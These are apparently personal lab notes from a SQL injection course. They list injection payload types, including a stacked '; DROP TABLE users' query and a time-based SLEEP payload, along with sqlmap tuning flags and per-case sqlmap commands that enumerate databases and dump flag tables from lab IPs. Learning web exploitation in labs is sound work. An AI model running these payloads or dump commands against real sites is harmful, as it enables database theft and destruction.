# <span style=color:red>Database</span>
```
Web App/Services
 |
 |--DBS
    |
    |--Database
        |
        |---Table
             |
             |---Column
                  |
                  |---Data
```

---
# <span style=color:red>SQL Injection Types</span>
* Boolean-based blind
    * AND 1=1
* Error-base
    * AND GTID_SUBSET(@@version,0)
* UNION query-based
    * UNION ALL SELECT 1,@@version,3
* Stacked queries
    * ; DROP TABLE users
* Time-based blind
    * AND 1=IF(2>1,SLEEP(5),0)
---
* --crawl、--forms或-g
    * auto find parameter
* -r req.txt
    * burp to save as req.txt 
![image](https://hackmd.io/_uploads/r13KXNI4R.png)
* --parse-errors
    * to parse the DBMS errors
* --method PUT
# <span style=color:red>Tuning</span>
* --prefix="%'))" --suffix="-- -"
* --level=5 --risk=3
* --technique
    * --technique=u
        * UNION
---
## <span style=color:#44D62C>Case1</span>
![image](https://hackmd.io/_uploads/r1tH6QUVR.png)
---
## <span style=color:#44D62C>Case2</span>
![image](https://hackmd.io/_uploads/HJGBqE8NC.png)
* sqlmap 'http://94.237.57.173:35918/case2.php' --data 'id=1*' --dbs
* sqlmap 'http://94.237.57.173:35918/case2.php' --data 'id=1*' -D testdb --tables
* sqlmap 'http://94.237.57.173:35918/case2.php' --data 'id=1*' -D testdb -T flag2 --dump
---
## <span style=color:#44D62C>Case3</span>
![image](https://hackmd.io/_uploads/B1L35VUNR.png)

![image](https://hackmd.io/_uploads/Hk-WaVUV0.png)
* 修改cookie欄位發現可以切換資料
* sqlmap 'http://94.237.57.173:35918/case3.php' --cookie 'id=1*' --dbs
* sqlmap 'http://94.237.57.173:35918/case3.php' --cookie 'id=1*' -D testdb --tables
* sqlmap 'http://94.237.57.173:35918/case3.php' --cookie 'id=1*' -D testdb -T flag3 --dump
* 官方解答<span style=color:red>sqlmap -u 'http://STMIP:STMPO/case3.php' -H 'Cookie: id=*' --batch --dump</span>
    * 這樣反而dump不出來?
        * 05/31得解, 因為她id=1*才對, 官方答案錯誤
![image](https://hackmd.io/_uploads/H1m9fBLV0.png)
---
## <span style=color:#44D62C>Case4</span>
* 回家補圖, burp攔截的圖
* sqlmap -r request.txt --dump
---
## <span style=color:#44D62C>Case5</span>
* sqlmap -u 'http://94.237.55.246:31216/case5.php?id=1' --risk 3 --level 5 --dbs --batch
* sqlmap -u 'http://94.237.55.246:31216/case5.php?id=1' --risk 3 --level 5 --T flag5 --batch
---
## <span style=color:#44D62C>Case6</span>
* sqlmap -u 'http://94.237.55.246:31216/case6.php?col=*' -T flag6 --dump --batch
---
## <span style=color:#44D62C>Case7</span>
* sqlmap -u 'http://94.237.55.246:31216/case6.php?id=1*' -T flag7 --dump --batch --technique=U
---
# <span style=color:red>Challege</span>
* --ignore-code 401
